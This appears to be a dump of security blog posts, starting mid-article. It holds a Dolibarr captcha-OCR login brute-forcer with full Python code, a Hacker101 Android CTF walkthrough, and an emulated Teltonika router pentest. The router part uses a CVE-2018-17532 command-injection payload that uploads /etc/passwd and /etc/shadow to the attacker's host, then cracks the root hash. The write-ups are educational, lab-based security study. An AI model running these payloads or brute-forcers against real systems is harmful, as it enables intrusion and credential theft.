\\x98&quot;0f\\x8c\\x8dJ\\x0c\\x84i\\x97\\xe4\\xe4\\x92\\x04a299\\xb88\\xc1\\x986up&amp;amp;\\x13\\x0b\\x94\\xc9\\x92\\xe4\\xc4\\x02Uk\\x11c\\xc3\\x025\\x81\\xc1\\x01a3v&amp;amp;\\r\\x00\\x00\\xb3\\xa2\\n[Z\\xaf@L\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82&#39; Now we need to save the bytes as an image. I’ll use BytesIO from the module io tosame our binary data to an image. For the image interaction i worked with the library PIL. You can check the output of BytesIO with the image.show() to verify the output. Now after building our image, i’ll use pytesseract with the option to get characters via OCR using image_to_string() The OCR detection can give some wrong output, so we need to do our test to extract a valid captcha code.The valid captcha code is always 5 characters and has only alphanumeric alphanumeric characters.from io import BytesIOimport pytesseractimport randomfrom PIL import Imageimport sysimport requestspytesseract.pytesseract.tesseract_cmd = &quot;/usr/bin/tesseract&quot;base_url = &quot;http://192.168.1.110/&quot;def get_captcha_code(base_url): code = &quot;&quot; while len(code) != 5: r = requests.get(f&quot;{base_url}core/antispamimage.php&quot;, verify=False) img = Image.open(BytesIO(r.content)) img.show() code = pytesseract.image_to_string(img).split(&quot;\\n&quot;)[0] #print(code) for char in code: if char not in &quot;aAbBCDeEFgGhHJKLmMnNpPqQRsStTuVwWXYZz2345679&quot;: code = &quot;&quot; break return codeprint(get_captcha_code(base_url))Here is a test for our OCR :Login : erros and succesFor the error message, we have a string “Bad value for login or password”. It’s located in a div&amp;lt;div class=&quot;center login_main_message&quot;&amp;gt;&amp;lt;div class=&quot;error&quot;&amp;gt; Bad value for login or password &amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;For the wrong captcha, we see a different message but in the same div&amp;lt;div class=&quot;center login_main_message&quot;&amp;gt;&amp;lt;div class=&quot;error&quot;&amp;gt; Bad value for security code. Try again with new value... &amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;If we login with right credentials we can see a 302 redirection.I did a simple test for the right login detection. If we find no error message, it’s a successful login. It’s just for the POC. Better have a test case with the 302 redirection status code.Notes after debugging : My post request refuses to stop following redirects with the option “allow_redirects=False”. The problem is with the used url, i need to use /index.php?mainmenu=home instead of /admin/index.php?mainmenu=home to have the 302 redirection.POCNow i’ll combine the OCR reading with the login post request to bruteforce login. I’ll use beautifulsoup library to extract token and error messages. Simple loop for testing passwords from a file. I used [:-1] to remove “\\n” from passwords to simplify. Use the headers and data values from the captured login post request. Get the used cookies Simple code structure for testing. I’ll make a clean version in my github repository for the tool (at the end of the article). Change the variable pytesseract.pytesseract.tesseract_cmd for tesseract binary location and OS.# Linuxpytesseract.pytesseract.tesseract_cmd = &quot;/usr/bin/tesseract&quot;# Windowspytesseract.pytesseract.tesseract_cmd = &#39;C:/Program Files/Tesseract-OCR/tesseract.exe&#39;POC codeimport requestsfrom bs4 import BeautifulSoupimport lxmlimport urllibfrom io import BytesIOfrom urllib.parse import quote_plus as qpimport pytesseractfrom PIL import Imagefrom requests.structures import CaseInsensitiveDictimport sys#Linuxpytesseract.pytesseract.tesseract_cmd = &quot;/usr/bin/tesseract&quot;#Windows#pytesseract.pytesseract.tesseract_cmd = &#39;C:/Program Files/Tesseract-OCR/tesseract.exe&#39;username = &quot;admin&quot;passwords = open(&quot;default-passwords.txt&quot;, &quot;r&quot;)base_url = &quot;http://192.168.1.110/&quot;login_url = base_url + &quot;index.php?mainmenu=home&quot;headers = CaseInsensitiveDict()def get_captcha_code(base_url): code = &quot;&quot; while len(code) != 5: r = session.get(f&quot;{base_url}core/antispamimage.php&quot;, verify=False) img = Image.open(BytesIO(r.content)) #img.show() code = pytesseract.image_to_string(img).split(&quot;\\n&quot;)[0] for char in code: if char not in &quot;aAbBCDeEFgGhHJKLmMnNpPqQRsStTuVwWXYZz2345679&quot;: code = &quot;&quot; break return codefor password in passwords: a = 1 while(a==1): session = requests.Session() request = session.get(login_url) captcha = get_captcha_code(base_url) # Get the token value page_source = BeautifulSoup(request.text,&quot;lxml&quot;) token = page_source.find(&quot;input&quot;,{&#39;name&#39;:&#39;token&#39;})[&#39;value&#39;] cookies = session.cookies headers[&quot;Connection&quot;] = &quot;keep-alive&quot; headers[&quot;Cache-Control&quot;] = &quot;max-age=0&quot; headers[&quot;Upgrade-Insecure-Requests&quot;] = &quot;1&quot; headers[&quot;Origin&quot;] = base_url headers[&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot; headers[&quot;User-Agent&quot;] = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36&quot; headers[&quot;Accept&quot;] = &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot; headers[&quot;Referer&quot;] = base_url + &quot;index.php?mainmenu=home&quot; headers[&quot;Accept-Language&quot;] = &quot;en-US,en;q=0.9,ar;q=0.8,fr;q=0.7&quot; # you can use json object or f string format data = &quot;token=&quot; + str(urllib.parse.quote(token,safe=&#39;&#39;)) + &quot;&amp;amp;actionlogin=login&amp;amp;loginfunction=loginfunction&amp;amp;tz=1&amp;amp;tz_string=Africa%2FCasablanca&amp;amp;dst_observed=0&amp;amp;dst_first=2022-05-8T01%3A59%3A00Z&amp;amp;dst_second=2022-03-27T02%3A59%3A00Z&amp;amp;screenwidth=1038&amp;amp;screenheight=718&amp;amp;dol_hide_topmenu=&amp;amp;dol_hide_leftmenu=&amp;amp;dol_optimize_smallscreen=&amp;amp;dol_no_mouse_hover=&amp;amp;dol_use_jmobile=&amp;amp;username=&quot; + str(username) + &quot;&amp;amp;password=&quot; + str(password[:-1]) + &quot;&amp;amp;code=&quot; + str(captcha) resp = session.post(login_url, headers=headers, data=data, cookies=cookies, allow_redirects=False) login = BeautifulSoup(resp.text,&quot;lxml&quot;) error_message = login.find(&quot;div&quot;,{&#39;class&#39;:&#39;error&#39;}) #print(str(resp.status_code) + &quot; &quot; + password[:-1]) if error_message != None : if(error_message.text.strip() == &quot;Bad value for login or password&quot;): print(f&quot;[!] [{resp.status_code}] Wrong login {username}:{password[:-1]}&quot;) a = 0 else: if (error_message.text.strip() == &quot;Bad value for security code. Try again with new value...&quot;): print(f&quot;[!] [{resp.status_code}] Wrong captcha ocr. Retrying...&quot;) if resp.status_code == 302 : print(f&quot;[*] Done! {username}:{password[:-1]} &quot;) sys.exit()KudosThanks to some exploits authors in exploit-db, I was inspired by their code : Dolibarr ERP-CRM 12.0.3 - Remote Code Execution (Authenticated) https://www.exploit-db.com/exploits/49269 Dolibarr 12.0.3 - SQLi to RCE : https://www.exploit-db.com/exploits/49240Tool in GithubI published the tool with the name DoliBrute. It has a more clean code than the POC. I’ll work on it for more updates.https://github.com/BaadMaro/DoliBruteConclusionI hope you find this article useful. If you want to hunt for vulnerabilities on Dolibarr, go check their secrurity policy https://github.com/Dolibarr/dolibarr/security/policy" }, { "title": "Android Applications Pentesting, Intentional Exercise from Hackerone platform", "url": "/posts/Android-Applications-Pentesting,-Intentional-Exercise-from-Hackerone-platform/", "categories": "Writeup, Android", "tags": "Android, Bug Bounty", "date": "2022-07-27 00:00:00 +0000", "snippet": "Today we are going to practice some Android pentesting with a challenge made by Hackerone platform.I’ll explain different techniques used in Android pentesting with a practical overview.This article was made for the day 2 of the hack event organised by The Hacking News B’Darija.ChallengeWe can access the challenege using https://ctf.hacker101.com/ctfIntentional Exercise Challenge setuphttps://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/**Your Android APK is building. Please refresh in a few seconds.**https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/level13.apkhttps://book.hacktricks.xyz/mobile-pentesting/android-app-pentestingInstal the apk using BluestackesI didn’t have time to setup a clean setup for an Android emulator on my Linux machine, so i just used my Windows machine with Bluestacks emulator. It’s probably simple to setup Burpsuite proxy with it, right ? :unamused:After installing the app, we can see it in your app menu.Proxy setup with BurpsuiteTo intercept requests from our android app, I’ll use Burpsuite. You can use the community version it’s free https://portswigger.net/burpWe need to set the proxy used by bluestackes using HD-ConfigHttpProxy.exe. You can find it in your application installation.Now let’s add our burp proxy.After setting a proxy, you need to restart Bluestacks. You can use the reset option to go back to default settings.Now we need to : Use BlueStacks Tweaker to root the emulator. Install root certificate manager from the Google Play store. Import the burp certificate. You can export it from the proxy tab. Intercept requests while opening the appBefore the app shows the webview, we can see a request to https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot?&amp;amp;hash=61f4518d844a9bd27bb971e55a23cd6cf3a9f5ef7f46285461cf6cf135918a1aHere is the response : HTTP/1.1 200 OKDate: Wed, 27 Jul 2022 19:29:48 GMTContent-Type: text/html; charset=utf-8Content-Length: 64Connection: closeServer: openresty/1.21.4.1&amp;lt;h1&amp;gt;Welcome to Level13&amp;lt;/h1&amp;gt;&amp;lt;a href=&quot;appRoot/flagBearer&quot;&amp;gt;Flag&amp;lt;/a&amp;gt;After forwarding the requests, let’s see what happens after clicking “Flag.”We can see a new request to /appRoot/flagBearer same output as our first request. After forwarding the request, we see an output with an invalid request Here is the response : HTTP/1.1 200 OKDate: Wed, 27 Jul 2022 19:32:18 GMTContent-Type: text/html; charset=utf-8Content-Length: 15Connection: closeServer: openresty/1.21.4.1Invalid requestNow let’s try to analyze what we were able to find : Leaked the used domain : 86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com Hash parametre with /appRoot : hash=61f4518d844a9bd27bb971e55a23cd6cf3a9f5ef7f46285461cf6cf135918a1a openresty/1.21.4.1 : Web server version. It’s probably the load blanacer https://openresty.org/en/ The app may be trying to verify a hash token with /appRoot to access/appRoot/flagBearer which is our final access. We can check the links with our browser, It’s seems like the app is using a webview. We can get the same behavior. We did some testing with the app, now let’s switch to some reversing with the apk file.What is an apk file ?A file with the APK file extention is an Android Package file that’s used to distribute apps on Google’s Android operating systemAPK files are saved in the ZIP format and are typically downloaded directly to Android devices, usually via Google Play, but can also be found on other websites.APKLeaksThere is a tool called APKLeaks that helps with getting urls, endpoints, and secrets from our apk files. It’s used by bug bounty hunters  https://github.com/dwisiswant0/apkleaksAs we can see, there are some android xml files and a domain used with a endpoint or maybe a directory /appRoot.Expectation :And then you’ll be like, “emm, some juicy cash money for my bug bounty report :smirk: “Reality : :skull:ApktoolIt’s a tool for reverse engineering Android apk files. We are going to use it to extract files from our apk. You can check the documentation for more details https://ibotpeaches.github.io/Apktool/You can see instructions here to install it.As i’m using Kali Linux, there is a package for it. We can use apt to install  sudo apt install apktoolLet’s extract the apk file  The AndroidManifest.xml is important for security research, it’s has the permissions required by the app, which can be abused if it’s not configured properly. We can read more about that  :   https://pentestlab.blog/2017/01/24/security-guidelines-for-android-manifest-files/   https://www.briskinfosec.com/blogs/blogsdetail/Android-Manifest-File-Analysis-101 Our focus today is the classes.dex file. The code is packed into .dex files. Dex stands for Dalvik Executable. A Dex file contains code that is ultimately executed by the Android Runtime. We can convert dex files to jar files using the dex2jar tool.Now let’s decompile the jar file using JD-GUI http://java-decompiler.github.io/As we can see here, the application configuration details.Now let’s go to our target, the MainActivity.class. It’s like the main code from our Android app. We can read more about Android app development to get more details about it.MainActivity.classpackage com.hacker101.level13; import android.net.Uri; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.webkit.WebView; import android.webkit.WebViewClient; import java.math.BigInteger; import java.nio.charset.StandardCharsets; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { protected void onCreate(Bundle paramBundle) { super.onCreate(paramBundle); setContentView(2131296284); WebView webView = (WebView)findViewById(2131165328); webView.setWebViewClient(new WebViewClient()); Uri uri = getIntent().getData(); String str1 = &quot;https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot&quot;; String str3 = &quot;&quot;; if (uri != null) { str3 = uri.toString().substring(28); StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(&quot;https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot&quot;); stringBuilder.append(str3); str1 = stringBuilder.toString(); } String str2 = str1; if (!str1.contains(&quot;?&quot;)) { StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(str1); stringBuilder.append(&quot;?&quot;); str2 = stringBuilder.toString(); } try { MessageDigest messageDigest = MessageDigest.getInstance(&quot;SHA-256&quot;); messageDigest.update(&quot;s00p3rs3cr3tk3y&quot;.getBytes(StandardCharsets.UTF_8)); messageDigest.update(str3.getBytes(StandardCharsets.UTF_8)); byte[] arrayOfByte = messageDigest.digest(); BigInteger bigInteger = new BigInteger(); this(1, arrayOfByte); String str = String.format(&quot;%064x&quot;, new Object[] { bigInteger }); StringBuilder stringBuilder = new StringBuilder(); this(); stringBuilder.append(str2); stringBuilder.append(&quot;&amp;amp;hash=&quot;); stringBuilder.append(str); webView.loadUrl(stringBuilder.toString()); } catch (NoSuchAlgorithmException noSuchAlgorithmException) { noSuchAlgorithmException.printStackTrace(); } } }Now we have the source code what to do ?It’s just the app code for us x)As we see from our first interaction with app http requests, we need to understand how to get the hash to access /appRoot/flagBearer or maybe use it for other things.Start analyzing First we can see the libraires imported and used. The app sets a webview to be able to see urls. Start to build a url insied URI class probably https://developer.android.com/reference/java/net/URIWe can see the code when URI is null if (uri != null) { str3 = uri.toString().substring(28); StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(&quot;https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot&quot;); stringBuilder.append(str3); str1 = stringBuilder.toString(); } str1 = “https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot”; build the str2 with str1 + append “?” Try to do some fancy encryption for a string to convert it to a hash and build the final URL try { MessageDigest messageDigest = MessageDigest.getInstance(&quot;SHA-256&quot;); messageDigest.update(&quot;s00p3rs3cr3tk3y&quot;.getBytes(StandardCharsets.UTF_8)); messageDigest.update(str3.getBytes(StandardCharsets.UTF_8)); byte[] arrayOfByte = messageDigest.digest(); BigInteger bigInteger = new BigInteger(); this(1, arrayOfByte); String str = String.format(&quot;%064x&quot;, new Object[] { bigInteger }); StringBuilder stringBuilder = new StringBuilder(); this(); stringBuilder.append(str2); stringBuilder.append(&quot;&amp;amp;hash=&quot;); stringBuilder.append(str); webView.loadUrl(stringBuilder.toString()); } catch (NoSuchAlgorithmException noSuchAlgorithmException) { noSuchAlgorithmException.printStackTrace(); }If you can’t understand what the code does, you can simply create a Java code and start importing the used libraries and print each line to see the output. We need to add used string variables and also set a URI value for testing.import java.math.BigInteger;import java.nio.charset.StandardCharsets;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;class test { public static void main(String[] args) { // here we need to the add used URI and string values. // put the try catch and start analysing using System.out.println() } }After doing some testing, let’s get back to our way of finding the hash. for URI, I abused the function that shows how the URI is built if it’s null. if (uri != null) { str3 = uri.toString().substring(28); StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(&quot;https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot&quot;); stringBuilder.append(str3); str1 = stringBuilder.toString(); }As we can see, it does a substring of 28 and takes the last part https://www.javatpoint.com/substringclass test { public static void main(String[] args) { String URI = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBB&quot;; System.out.println(URI.toString().substring(28)); }}BBBBBBBfor the str1 we have an URL + str3 (URI.toString().substring(28))https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot + str3We use “BBBB” for str3 at the moment. We can see that the beginning is probably a “/”Now str1 = https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot/BBBBThe str2 is str1 + “?”https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot/BBBB?At the encryption part, we can see that the code appends another &amp;amp;hash= and the hash value to the final string. stringBuilder.append(str2); stringBuilder.append(&quot;&amp;amp;hash=&quot;); stringBuilder.append(str);https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot/BBBB?hash=XIt looks familiar, right ? If we go back to our requests analysis at the beginning, we can see the same format.https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot?&amp;amp;hash=61f4518d844a9bd27bb971e55a23cd6cf3a9f5ef7f46285461cf6cf135918a1aFor the BBBB part, it’s possible that it has flagBearer or /appRoot/flagBearer. URI Format can be URL/appRoot/flagBearerNow let’s go for our solution. I used the same Main code with some modifications to get our hash. We can use an online Java compiler or execute it from your system if you have Java installed.import java.math.BigInteger;import java.nio.charset.StandardCharsets;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;class get_hash { public static void main(String[] args) { String uri = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAA/flagBearer&quot;; String str1 = &quot;https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot&quot;; String str3 = &quot;&quot;; if (uri != null) { str3 = uri.toString().substring(28); StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(&quot;https://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot&quot;); stringBuilder.append(str3); str1 = stringBuilder.toString(); } String str2 = str1; if (!str1.contains(&quot;?&quot;)) { StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(str1); stringBuilder.append(&quot;?&quot;); str2 = stringBuilder.toString(); } try { MessageDigest messageDigest = MessageDigest.getInstance(&quot;SHA-256&quot;); messageDigest.update(&quot;s00p3rs3cr3tk3y&quot;.getBytes(StandardCharsets.UTF_8)); messageDigest.update(str3.getBytes(StandardCharsets.UTF_8)); byte[] arrayOfByte = messageDigest.digest(); BigInteger bigInteger = new BigInteger(1, arrayOfByte); String str = String.format(&quot;%064x&quot;, new Object[] { bigInteger }); StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(str2); stringBuilder.append(&quot;&amp;amp;hash=&quot;); stringBuilder.append(str); System.out.println(stringBuilder.toString()); } catch (NoSuchAlgorithmException noSuchAlgorithmException) { noSuchAlgorithmException.printStackTrace(); } }}Outputhttps://86c65fe0ecf5117f91f7d2eaf9adf25e.ctf.hacker101.com/appRoot/flagBearer?&amp;amp;hash=8743a18df6861ced0b7d472b34278dc29abba81b3fa4cf836013426d6256bd5eLet’s visit the urlWe were able to solve the challenge with right hash value.ConclusionI hope you find this article useful. You can learn more about Android application pentesting. There are many interesting attacks. You can take a look at : https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting ANDROID APP SECURITY BASICS https://www.youtube.com/watch?v=a8Gh7d8GebA HACKING ANDROID WebViews https://www.youtube.com/watch?v=qS5PkC-37io" }, { "title": "IoT Pentesting with Teltonika RUT9XX", "url": "/posts/IoT-Pentesting-with-Teltonika-RUT9XX/", "categories": "Writeup, IoT", "tags": "FAT, Firmware, router", "date": "2022-07-25 00:00:00 +0000", "snippet": "Today we are going to practice some IoT pentesting with a device called RUT950 as an example.I’ll explain different techniques used in IoT pentesting including emulation, firmware analysis, exploitation and pivoting.This article was made for a hack event organised by The hacking News B’Darija.DisclaimerAll information and software available on this page are for educational purposes only.Our targetRUT950 is a high-performance industrial 4G LTE Wi-Fi router designed as a Main/Backup internet source and guarantees a reliable internet connection with high data throughput and data redundancy.You can see all features here : https://teltonika-networks.com/product/rut950/I don’t have the device, so emulation is our go.EmulationA lot of IoT devices like routers and embedded systems runs on a RISC CPUs with MIPS architucture.The RUT950 has A MIPS CPU “Atheros, MIPS 74Kc, 550 MHz”. You can get more details from the datasheet https://teltonika-networks.com/downloads/en/rut950/RUT950_Datasheet-v1.0.pdfTo be able to emulate the router, we need a emulator/virtualizer to be able to transform MIPS instructions intended for the real hardware to our x64 system.There’s a project called Qemu. It’s a generic and open source machine emulator and virtualizer. You can read the documentation for more details here : https://qemu-project.gitlab.io/qemu/about/index.htmlHere is an example of a binary emulation from our target https://www.youtube.com/watch?v=xXfjmVJ_ihoAs we target a router system, there is project called Firmware Analysis Toolkit used to emulate firmware and analyse it for security vulnerabilities using Qemu https://github.com/attify/firmware-analysis-toolkitFirmware Analysis Toolkit : InstallationThe tool requires multiple dependencies. You can use the author’s OS for better experience https://github.com/adi0x90/attifyosFor me i will setup the tool in a Kali linux 2022.2 in vmware.Start by cloning the project from github and running the setup.shgit clone https://github.com/attify/firmware-analysis-toolkitcd firmware-analysis-toolkit./setup.shSome errors during installalation Before running setup.sh, if you use kali linux just remove lsb-core from the line 5. While installing binwalk there is a problem with the qt5base-dev. In line 64 in binwalk/deps.sh change “qt5base-dev” to “qtbase5-dev” https://github.com/ReFirmLabs/binwalk/blob/master/deps.sh#L46 Another problem with sasquatch compilation https://github.com/devttys0/sasquatch/issues/48. in binwalk/deps.sh change “https://github.com/devttys0/sasquatch” to “https://github.com/threadexio/sasquatch” It’s fork that has the fix https://github.com/ReFirmLabs/binwalk/blob/master/deps.sh#L86 Now return the setup.sh file , comment git clone binwalk https://github.com/attify/firmware-analysis-toolkit#L8 and rerun setup.sh.After installation, we need to add sudo password to the config file “fat.config”.[DEFAULT]sudo_password=kalifirmadyne_path=/home/attify/firmadyneEmulation using firmwareFor the emulation, we going to use the router firmware. You can find it at https://wiki.teltonika-networks.com/view/RUT950Firmware_Downloads(legacy_WebUI)There’s a technique to dump the firmware from the UART interface and also get a shell.UART is used for asynchronous serial communications to send and receive data from devices for purposes such as updating firmware manually, debugging tests, or interfacing with the underlying systemFor our target, UART is not supported (maybe) https://teltonika-networks.com/compare/?networking=rut950,rut955. We can find a close version with serial enabled https://fccid.io/2AET4RUT955AF/Internal-Photos/Internal-Photos-4897313here is an example for RUTX09 https://community.teltonika-networks.com/18898/notice-there-internal-serial-port-device-rutx09-how-do-use-itTo be able to communicate with the UART interface, we need a USB to serial converter.You can find more details here about the whole thing : https://www.youtube.com/watch?v=YD6ODeER8qM For the firmware, i’ll use an old version # RUT9XX_R_00.04.172  2018.04.10 Running fat.py with our firmware./fat.py RUT9XX_R_00.04.172_WEBUI.binIn the first try, i had a an empty network interfaces so i increased the timeout to 360 in scripts/inferNetwork.shecho &quot;Running firmware ${IID}: terminating after 360 secs...&quot;timeout --preserve-status --signal SIGINT 360 &quot;${SCRIPT_DIR}/run.${ARCH}.sh&quot; &quot;${IID}&quot;Now let’s run it againWe can see our machine ip address let’s click enter nowWe can use enter again after init finshed to access shellAfter a while check the router webpage at http//:192.168.1.1Let’s run an nmap scan to see if other services are up too┌──(kali㉿kali)-[~]└─$ nmap -sC -sV 192.168.1.1Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 17:03 EDTNmap scan report for 192.168.1.1Host is up (0.0089s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh Dropbear sshd 2018.76 (protocol 2.0)53/tcp open domain dnsmasq 2.78| dns-nsid: |_ bind.version: dnsmasq-2.7880/tcp open http LuCI Lua http config|_http-title: Site doesn&#39;t have a title (text/html).443/tcp open ssl/http LuCI Lua http config|_http-title: Site doesn&#39;t have a title (text/html).| ssl-cert: Subject: commonName=Teltonika/stateOrProvinceName=Vilnius/countryName=LT| Not valid before: 2018-04-10T12:23:14|_Not valid after: 2020-04-09T12:23:14|_ssl-date: 2018-04-10T12:27:39+00:00; -4y105d08h36m43s from scanner time.Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelAs we can see we have ssh, dns, http and https up. Now let’s do some hacking stuff.VulnerabilitiesThere are many ways to find vulnerabilities in our system : Firmware : the best way to start is by exploring the firmware. We can find a lot of things like services source code, hardcoded creds and more. I’ll do a quick overview later in the article Services : as we can see in our previous nmap scan, we were able to identify services versions like dropbear ssh 2018.76 for ssh, dnsmasq 2.78 for dns and LuCI lua http for the web service. We can search for vulnerabilities in these services. Routersploit : is an open-source exploitation framework dedicated to embedded devices. It’s has a lot of exploits, creds, scanners, payloads and generic attacks modules for embedded devices https://github.com/threat9/routersploit Releases changelog : in many scenarios we can see that a device is not running the latest version, so we can track fixes for newers version. For example in our case i choosed the version “RUT9XX_R_00.04.172WEBUI.bin” if we go above a little bit we can see that in the version “RUT9XX_R_00.04.233” a CVE was fixed https://wiki.teltonika-networks.com/view/RUT950_Firmware_Downloads(legacy_WebUI) - Fixes: - Minor Hotspot fixes (CVE-2018-17532) - Minor SIM Switch fixes - Minor opkg fix and package update Searching for CVEs : https://www.opencve.io/cve?vendor=teltonika&amp;amp;product=rut950_firmware POCs : we can search on github also for same research about the device. Sometimes you can find some research and tools that can help with the pentesting documentation. Finiding your own exploit / Bug bounty : You can go for the ultimate win by analysing the device and try find exploits. As an example we can use burp and start exploring the web interface to garther more information and start analyzing / fuzzing. The firmware can help also in this case, we can look at web files and reverse used binaires also. Here is an example of an exploit found by analyzing a binary in a TP link router : https://www.youtube.com/watch?v=zjafMP7EgEA CVE-2018-17532 : Teltonika RUT9XX Unauthenticated OS Command InjectionTeltonika RUT9XX routers with firmware before 00.04.233 are prone to multiple unauthenticated OS command injection vulnerabilities in autologin.cgi and hotspotlogin.cgi due to insufficient user input sanitization. This allows remote attackers to execute arbitrary commands with root privileges.We can see more details here : https://www.opencve.io/cve/CVE-2018-17532Full explanation here : https://github.com/sbaresearch/advisories/tree/public/2018/SBA-ADV-20180319-01_Teltonika_OS_Command_InjectionWith the “hotspotlogin.cgi” file, he found that there is no proper sanitization for user input in the uamip parameter that is loaded in an os.execute :skull: POCAn attacker can exploit this vulnerability by manipulating the uamip parameter:curl -v -o /dev/null &quot;http://$IP/cgi-bin/hotspotlogin.cgi&quot; -d &#39;send=1&amp;amp;uamip=&quot;; id &amp;gt;/tmp/test #&#39;The device executes the commands with root privileges:cat /tmp/testuid=0(root) gid=0(root)Let’s use the exploit with our emulated deviceThe exploit is blind, so we need something to see the output without accessing the router shell.I’ll use a webserver https://pypi.org/project/uploadserver/┌──(kali㉿kali)-[~]└─$ python3 -m uploadserverFile upload available at /uploadServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...Sending the exploitcurl -v -o /dev/null &quot;http://192.168.1.1/cgi-bin/hotspotlogin.cgi&quot; -d &#39;send=1&amp;amp;uamip=&quot;; curl -X POST http://192.168.1.110:8000/upload -F &quot;files=@/etc/passwd&quot; #&#39;* Trying 192.168.1.1:80... % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0* Connected to 192.168.1.1 (192.168.1.1) port 80 (#0)&amp;gt; POST /cgi-bin/hotspotlogin.cgi HTTP/1.1&amp;gt; Host: 192.168.1.1&amp;gt; User-Agent: curl/7.82.0&amp;gt; Accept: */*&amp;gt; Content-Length: 87&amp;gt; Content-Type: application/x-www-form-urlencoded&amp;gt; } [87 bytes data]100 87 0 0 100 87 0 27 0:00:03 0:00:03 --:--:-- 27* Mark bundle as not supporting multiuse&amp;lt; HTTP/1.1 200 OK&amp;lt; Connection: close&amp;lt; Transfer-Encoding: chunked100 87 0 0 100 87 0 23 0:00:03 0:00:03 --:--:-- 23&amp;lt; Content-Type: text/html; charset=utf-8&amp;lt; { [5 bytes data]100 2760 0 2673 100 87 736 23 0:00:03 0:00:03 --:--:-- 759* Closing connection 0 Let’s see our server┌──(kali㉿kali)-[~]└─$ python3 -m uploadserverFile upload available at /uploadServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...192.168.1.1 - - [24/Jul/2022 17:45:48] Upload of &quot;passwd&quot; accepted192.168.1.1 - - [24/Jul/2022 17:45:48] &quot;POST /upload HTTP/1.1&quot; 204 -192.168.1.1 - - [24/Jul/2022 17:45:50] Upload of &quot;passwd&quot; accepted192.168.1.1 - - [24/Jul/2022 17:45:50] &quot;POST /upload HTTP/1.1&quot; 204 -We were able to get the passwd file, let’s check itroot:x:0:0:root:/root:/bin/ashdaemon:*:1:1:daemon:/var:/bin/falseftp:*:55:55:ftp:/home/ftp:/bin/falsenetwork:*:101:101:network:/var:/bin/falsenobody:*:65534:65534:nobody:/var:/bin/falseAs we can see the os command injection worked and we were able to get the passwd file using curlNow let’s try with a reverse shell. I tried multiple reverse shells with bash ,ash and sh but without success. We need to find another solution.Shadow fileAs the exploit run commandes using root privileges, let’s read the /etc/shadow filecurl -v -o /dev/null &quot;http://192.168.1.1/cgi-bin/hotspotlogin.cgi&quot; -d &#39;send=1&amp;amp;uamip=&quot;; curl -X POST http://192.168.1.110:8000/upload -F &quot;files=@/etc/shadow&quot; #&#39;root:$1$o1tYRea4$blIAJ7l1GqkT8NTwcC41n1:15225:0:99999:7:::daemon:*:0:0:99999:7:::ftp:*:0:0:99999:7:::network:*:0:0:99999:7:::nobody:*:0:0:99999:7:::We got the root hash. It’s a md5crypt hash. Let’s crack it using hashcat or john.┌──(kali㉿kali)-[~]└─$ john hash.txtCreated directory: /home/kali/.johnWarning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 4 OpenMP threadsProceeding with single, rules:SinglePress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusAlmost done: Processing the remaining buffered candidate passwords, if any.Proceeding with wordlist:/usr/share/john/password.lstProceeding with incremental:ASCIIadmin01 (?) 1g 0:00:00:47 DONE 3/3 (2022-07-24 18:09) 0.02124g/s 105252p/s 105252c/s 105252C/s adoutt1..admarriUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt 